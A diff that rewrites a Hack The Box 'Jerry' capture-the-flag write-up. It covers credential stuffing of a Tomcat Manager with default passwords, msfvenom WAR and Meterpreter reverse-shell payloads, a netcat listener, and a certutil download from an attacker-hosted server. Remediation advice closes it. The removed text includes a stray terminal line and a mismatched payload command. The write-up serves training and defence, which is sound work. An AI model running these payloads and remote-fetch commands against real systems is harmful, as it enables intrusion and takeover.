@@ -1,192 +1,344 @@
-Machine name: Jerry
-Platform: Hackthebox
-difficulty: Easy
-target IP: 10.10.10.95 
+# Hack The Box - Jerry
 
-### Enumeration:
+| Property | Value |
+|----------|-------|
+| **Machine** | Jerry |
+| **Platform** | Hack The Box |
+| **Difficulty** | Easy |
+| **Target IP** | `10.10.10.95` |
 
-**nmap scan:**
-![[Pasted image 20260726221034.png|519]]
+---
 
-| Port | State | Service | Version                             |
-| ---- | ----- | ------- | ----------------------------------- |
-| 8080 | open  | http    | Apache Tomcat/coyote JSP engine 1.1 |
- **Website analysis:** ![[Pasted image 20260726230345.png]]
-- as it is running the apache tomcat, and has a login page so we will try to gain access but credential stuffing.
+## Objective
 
-**Credential discovery:**
-![[Pasted image 20260727195028.png|513]]
-This is page contains tomcat default credential .
-- save these credentials into the a tomcat.txt file.
+Jerry is an **easy** Windows machine that demonstrates how **default Apache Tomcat credentials** can lead to remote code execution. The objective is to obtain administrative access to the Tomcat Manager, deploy a malicious WAR application, establish a reverse shell, and upgrade it to a Meterpreter session for post-exploitation.
 
-### Exploitation:
-**Burp-suit:** use burp-suit to credential stuffing in the website.
+---
 
-- open the burp-suit and go to the proxy and then turn on the interceptor.
-![[Pasted image 20260727214449.png]]
+## Enumeration
 
-- Click the **Manager App** button on the Tomcat homepage.
-![[Pasted image 20260727215619.png|225]]
-by this a request will go to the intercepter and then forward it and a username password interface will pop-up in the website.
+### Nmap Scan
 
-- enter the any credentials into it and click ok , this will give a request to the proxy.
-![[Pasted image 20260727215915.png|447]]
+The target was scanned to identify open ports and running services.
 
-- now we have to change the format of the tomcat.txt file into the same as the format of blue box and then change them into base64 format like in red box given in the image below.
-![[Pasted image 20260727222238.png|339]]
+<img width="510" height="157" alt="image" src="https://github.com/user-attachments/assets/62313fc0-2219-4b73-b942-e8bbd9d655c4" />
 
-![[Pasted image 20260728150500.png]]
-fig: changed tomcat.txt.
 
-- how to change the normal credential into base64.
-![[Pasted image 20260728151549.png|400]]
-```
+| Port | State | Service | Version |
+|------|------|---------|---------|
+| 8080 | Open | HTTP | Apache Tomcat/Coyote JSP Engine 1.1 |
+
+### Analysis
+
+The scan identified **Apache Tomcat** running on **port 8080**. Since Tomcat Manager was exposed and presented an authentication page, testing default credentials became the next logical step.
+
+---
+
+## Credential Discovery
+
+The Apache Tomcat documentation contains a list of commonly used default credentials.
+
+<img width="677" height="470" alt="image" src="https://github.com/user-attachments/assets/df8bf394-998d-4f52-87d4-e0ce003654d6" />
+
+
+These credentials were saved into a file (`tomcat.txt`) for automated authentication testing.
+
+---
+
+## Exploitation
+
+### Credential Stuffing with Burp Suite
+
+Launch Burp Suite and enable the proxy interceptor.
+
+<img width="431" height="220" alt="image" src="https://github.com/user-attachments/assets/f25e042d-ed4b-4d4d-b6d1-172a0f7e499f" />
+
+
+Select **Manager App** on the Tomcat homepage.
+
+<img width="166" height="73" alt="image" src="https://github.com/user-attachments/assets/a1ebe722-00ab-4aa9-965f-4a26e6251dc6" />
+
+
+The authentication request is intercepted by Burp Suite.
+
+Enter any username and password to capture the HTTP Basic Authentication request.
+
+<img width="557" height="216" alt="image" src="https://github.com/user-attachments/assets/09043846-cef9-4ee3-b56f-247e8827c1c0" />
+
+
+---
+
+### Preparing the Payload List
+
+The credential list must be converted into the same format used by the **Authorization** header.
+
+<img width="290" height="192" alt="image" src="https://github.com/user-attachments/assets/cbbdbb8d-c0ef-41f4-a9e1-e1971cabef55" />
+
+into.
+
+<img width="112" height="127" alt="image" src="https://github.com/user-attachments/assets/2a29da4b-c7c4-4bab-bdc9-6f24bb76512d" />
+
+
+Each username and password combination is encoded using Base64.
+
+```text
 echo -n 'tomcat:tomcat' | base64
 ```
-HTTP Basic Authentication sends credentials in Base64 format. Therefore, each username and password pair must be encoded before being used as a Burp Intruder payload.
 
-- Change all the credential in the tomcat.txt file into base64.
-to do this make a bash script.
-![[Pasted image 20260728154643.png|599]]
-```
+Since HTTP Basic Authentication transmits credentials in Base64 format, every credential pair must be encoded before being supplied to Burp Intruder.
+
+To automate the conversion:
+
+```text
 for cred in $(cat tomcat.txt); do echo -n $cred | base64; done
 ```
+<img width="711" height="179" alt="image" src="https://github.com/user-attachments/assets/f8adb1a7-56de-41ce-b235-b36c54393de9" />
 
-- open the intruder in the burp-suit and Add$ the payload parameter  and keep the attack type to sniper.
-![[Pasted image 20260728155402.png|585]]
-- go to the payload section and paste the all base64 payloads we generated.
-![[Pasted image 20260728155318.png|336]]
-- disable the url incoding , as i will try to connect each payload to the there urls.
-![[Pasted image 20260728155518.png|499]]
-- After the Intruder attack completes, compare the response lengths. One request has a significantly larger response, indicating a successful login.
-![[Pasted image 20260728160120.png|400]]
-The target is running Apache Tomcat and exposes the Tomcat Manager login page. Since Tomcat installations are often configured with default credentials, credential testing was performed using a list of known default usernames and passwords.
+---
 
-![[Pasted image 20260728165457.png]]
+### Burp Intruder Attack
 
-**Successful Authentication:**
-![[Pasted image 20260728160522.png|509]]
+Configure Burp Intruder.
 
-- there section to upload **WAR file** into the website.
-![[Pasted image 20260728165834.png]]
-generate a **malicious WAR file** to upload here.
+- Add the **Authorization** parameter as the payload position.
+- Use **Sniper** attack type.
 
-**Generate the WAR Payload:**
-Generate a Java WAR reverse shell that can be uploaded through the Tomcat Manager application.(https://github.com/frizb/MSF-Venom-Cheatsheet)
+<img width="804" height="268" alt="image" src="https://github.com/user-attachments/assets/135ae84a-375d-447c-9884-b1108fadf010" />
+
+
+Paste the generated Base64 payloads.
+
+<img width="405" height="319" alt="image" src="https://github.com/user-attachments/assets/0e839fa7-000e-4310-8525-e6b6f2c97d4f" />
+
+
+Disable URL encoding.
+
+<img width="558" height="65" alt="image" src="https://github.com/user-attachments/assets/71165467-ce13-43ae-b37c-a1b67d45b8fe" />
+
+
+After the attack completes, compare the response lengths.
+
+<img width="447" height="143" alt="image" src="https://github.com/user-attachments/assets/5a78b1b3-5dd6-45e6-a593-4bc8db28dec5" />
+
+
+One response is significantly larger, indicating successful authentication.
+
+<img width="349" height="179" alt="image" src="https://github.com/user-attachments/assets/fc821020-a150-47ec-9ff9-bcaf692fc512" />
+
+
+---
+
+### Successful Authentication
+
+A valid set of default Tomcat credentials successfully authenticated to the Tomcat Manager.
+
+<img width="954" height="483" alt="image" src="https://github.com/user-attachments/assets/0f44f8dc-f7ed-4c58-b018-b69b2d729843" />
+
+
+The Tomcat Manager provides functionality to deploy WAR applications.
+
+<img width="553" height="199" alt="image" src="https://github.com/user-attachments/assets/62bdb70a-7712-4761-9f4e-8ff8bab7ac28" />
+
+---
+
+## Remote Code Execution
+
+### Generate the WAR Payload
+
+Create a malicious WAR reverse shell using **msfvenom**.
+
+```text
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f war > shell.war
 ```
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
-```
-enter your IP and port (let port be 4444.)
 
-- open a listener port using `netcat` , on the selected port in payload.
-```
+A Netcat listener was started to receive the reverse connection.
+
+```text
 nc -nvpl 4444
-``` 
-![[Pasted image 20260728173542.png]]
-
-**Deploying the WAR file:**
-- go to the website , upload the shell.war file into the website and open/run it.
-![[Pasted image 20260728173747.png]]
-
-**Obtaining Reverse Shell:**
-- check the `netcat` listener on the terminal.
-![[Pasted image 20260728174113.png]]
-### Post Exploitation:
-**Upgrading to Meterpreter:**
-To transfer files into the window machine so improve the shell and get more flexibility into the connection.
- you can change the payload to meterpreter for more flexible accessibility, [[Report on Devel (allows anonymous ftp login)]]
- 
-**Generate the payload:**
-```
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f aspx > ex.aspx
 ```
 
+<img width="622" height="111" alt="image" src="https://github.com/user-attachments/assets/1e63066e-1ad4-4807-a992-242f701a708e" />
 
-**Set the Multi-handler:**
-set the multi-handler in the msfconsole,
+
+---
+
+### Deploy the WAR File
+
+Upload the generated WAR file through the Tomcat Manager interface.
+
+<img width="675" height="68" alt="image" src="https://github.com/user-attachments/assets/90847398-df72-4ea2-84c0-41ac8fc4816c" />
+
+
+Execute the deployed application.
+
+---
+
+### Obtain Reverse Shell
+
+Once the WAR application is executed, the reverse shell connects back to the Netcat listener.
+
+<img width="465" height="173" alt="image" src="https://github.com/user-attachments/assets/84628b46-460f-4258-9c4a-d687a987fe18" />
+
+
+---
+
+## Post Exploitation
+
+### Upgrade to Meterpreter
+
+To improve stability and enable advanced post-exploitation features, the initial shell was upgraded to a Meterpreter session.
+
+Generate the Meterpreter payload.
+
+```text
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f exe > sh.exe
 ```
-set payload window/meterpreter/reverse_tcp
+
+Configure the Metasploit multi-handler.
+
+```text
+set payload windows/meterpreter/reverse_tcp
 ```
-- set the LHOST AND LPORT as same as the payload.
-- set ExitOnSession `false`.
-```
+
+Configure:
+
+```text
+set LHOST <Attacker-IP>
+set LPORT 4444
 set ExitOnSession false
 ```
 
-Now host a web-server to access the files in your window:
-```
-python -m http.server 80
-```
-![[Pasted image 20260728182235.png]]
-![[Pasted image 20260728182422.png]]
-└─$ geany overthewire.txt&
-[1] 98704
+Host the payload using a Python web server.
 
-Since Windows includes the `certutil` utility by default, it is used to download the payload directly from the attacker's web server.
+```text
+python3 -m http.server 80
 ```
-certutil -urlcache -f http://10.10.14.24/sh.exe c:\users\administrator\desktop\flags\sh.exe
+
+<img width="330" height="30" alt="image" src="https://github.com/user-attachments/assets/46d03074-491a-4463-be05-812697186f3e" />
+
+---
+<img width="192" height="281" alt="image" src="https://github.com/user-attachments/assets/ab1cc3bb-36a2-4689-bf2a-c34aa32d8448" />
+
+
+---
+
+### Transfer the Payload
+
+Download the executable using Windows **certutil**.
+
+```text
+certutil -urlcache -f http://<Attacker-IP>/sh.exe C:\Users\Administrator\Desktop\flags\sh.exe
 ```
-![[Pasted image 20260728193426.png]]
-after downloading `sh.exe`.
-- run the `sh.exe` file.
-Because it is a reverse Meterpreter payload, it immediately tries to connect back to `10.10.14.24:4444` , where the Metasploit multi/handler is listening.
-	so once the `sh.exe` executes , by the reverse tcp the metasploit will make a reverse connection , resulting in a fully interactive Meterpreter session.
-![[Pasted image 20260728193731.png]]
-Advantages of upgrading to Meterpreter include:
+
+<img width="622" height="313" alt="image" src="https://github.com/user-attachments/assets/4b4d1cdc-0dd3-4182-a24c-533a1f13195c" />
+
+
+Execute the payload.
+
+A Meterpreter reverse connection is established.
+
+<img width="622" height="121" alt="image" src="https://github.com/user-attachments/assets/19236d15-0b11-41bc-9653-a84a3d95f92a" />
+
+
+---
+
+## Meterpreter Advantages
+
+Upgrading to Meterpreter provides several benefits:
 
 - Stable encrypted communication
 - File upload and download
 - Process migration
 - Privilege management
-- Screenshot and webcam support (when applicable)
-- Easy shell management
-- Better post-exploitation capabilities
+- Screenshot capture
+- Improved shell interaction
+- Enhanced post-exploitation capabilities
 
-**Summary:**
-Enumeration identified Apache Tomcat 7.0.88 running on port 8080. By testing default Tomcat credentials, administrative access to the Tomcat Manager was obtained. A malicious WAR payload was deployed, resulting in remote code execution. The initial shell was upgraded to a Meterpreter session for improved post-exploitation capabilities. The assessment concluded with full SYSTEM-level access and successful retrieval of the target flags.
+---
 
-# Attack Path Summary
+## Attack Path Summary
 
 1. Enumerated the target using Nmap.
-2. Identified Apache Tomcat Manager running on port 8080.
-3. Gathered common Tomcat default credentials.
-4. Used Burp Suite Intruder to test the credentials.
+2. Identified Apache Tomcat Manager on port **8080**.
+3. Collected default Tomcat credentials.
+4. Performed credential stuffing using Burp Suite.
 5. Successfully authenticated to the Tomcat Manager.
-6. Generated a malicious WAR reverse shell payload.
-7. Uploaded and deployed the WAR file.
-8. Triggered the reverse shell.
-9. Generated a Meterpreter executable for a more reliable session.
-10. Hosted the executable using a Python HTTP server.
-11. Downloaded the payload with `certutil`.
+6. Generated a malicious WAR payload.
+7. Uploaded and deployed the WAR application.
+8. Obtained a reverse shell.
+9. Generated a Meterpreter payload.
+10. Hosted the payload using Python HTTP Server.
+11. Downloaded the executable with `certutil`.
 12. Executed the payload.
 13. Received a Meterpreter session.
-14. Retrieved the flags.
+14. Retrieved the target flags.
 
-**Attack chain workflow:**
-![[Pasted image 20260728193254.png|425]]
-# Key Learning Points
+### Attack Chain Workflow
 
-- Enumeration often reveals default services that expose administrative interfaces.
-- Default credentials remain one of the most common causes of server compromise.
-- Burp Suite Intruder can automate authentication testing.
-- Apache Tomcat Manager allows authenticated users to deploy WAR applications.
-- A WAR file can be used to gain code execution on a Tomcat server.
-- Windows `certutil` can be abused as a Living-off-the-Land Binary (LOLBin) to transfer files.
-- Upgrading from a basic reverse shell to Meterpreter significantly improves post-exploitation capabilities.
-- Matching the payload configuration between `msfvenom` and the Metasploit handler is essential for a successful reverse connection.
-# Remediation
+<img width="449" height="626" alt="image" src="https://github.com/user-attachments/assets/a7b2a59b-b2a7-4888-b743-7c97bd03ad61" />
 
-To prevent this attack:
 
-- Remove or disable default Tomcat credentials.
-- Use strong, unique administrator passwords.
-- Restrict access to the Tomcat Manager interface using IP allowlists or VPN access.
-- Remove unnecessary management applications from production systems.
-- Keep Apache Tomcat updated with the latest security patches.
-- Monitor and restrict the execution of LOLBins such as `certutil.exe`.
-- Deploy Endpoint Detection and Response (EDR) solutions capable of detecting malicious payload execution.
-- Limit outbound connections from servers where possible.
-- Monitor unusual WAR deployments and administrator logins.
-# Conclusion
+---
 
-The Jerry machine demonstrates how a seemingly small misconfiguration—leaving default Tomcat credentials enabled—can result in complete system compromise. By authenticating to the Tomcat Manager, deploying a malicious WAR file, and upgrading the initial shell to a Meterpreter session, full administrative control of the Windows server was obtained. This exercise highlights the importance of secure default configurations, strong authentication, proper access controls, and post-exploitation awareness in real-world penetration testing.
+## Risk Analysis
+
+### Finding: Default Apache Tomcat Credentials
+
+**Severity:** Critical
+
+**Risk**
+
+Default Tomcat credentials allowed unauthorized administrative access to the Tomcat Manager application.
+
+**Impact**
+
+- Administrative access to Tomcat
+- Remote code execution
+- Full system compromise
+- Deployment of malicious applications
+- Persistent attacker access
+
+**Remediation**
+
+- Remove all default credentials.
+- Enforce strong administrator passwords.
+- Restrict access to the Tomcat Manager using IP allowlists or VPN.
+- Disable unnecessary management interfaces.
+- Keep Apache Tomcat updated.
+- Monitor administrative logins and WAR deployments.
+- Restrict execution of LOLBins such as `certutil.exe`.
+- Deploy Endpoint Detection and Response (EDR) solutions.
+
+---
+
+## Root Cause
+
+The Apache Tomcat Manager application was exposed to the network and protected by **default credentials**, allowing an attacker to authenticate and deploy arbitrary WAR applications, resulting in remote code execution.
+
+---
+
+## Evidence
+
+- Nmap identified Apache Tomcat running on **port 8080**.
+- Successful authentication using default credentials.
+- Successful deployment of a malicious WAR application.
+- Reverse shell established.
+- Meterpreter session successfully obtained.
+
+---
+
+## Key Learning Points
+
+- Default credentials remain a major security risk.
+- Burp Suite Intruder can automate credential testing.
+- Apache Tomcat Manager allows authenticated WAR deployment.
+- WAR applications can provide remote code execution.
+- Windows `certutil` is commonly abused as a LOLBin for file transfer.
+- Meterpreter provides significantly better post-exploitation capabilities than a standard reverse shell.
+- Matching payload and handler configurations is essential for successful exploitation.
+
+---
+
+## Conclusion
+
+The **Jerry** machine demonstrates how **default credentials** can completely compromise an application server. By authenticating to the Apache Tomcat Manager, deploying a malicious WAR application, and upgrading the initial reverse shell to a Meterpreter session, full administrative control of the target was obtained. This machine highlights the importance of changing default credentials, securing administrative interfaces, restricting management access, and maintaining secure server configurations to prevent unauthorized access and remote code execution.
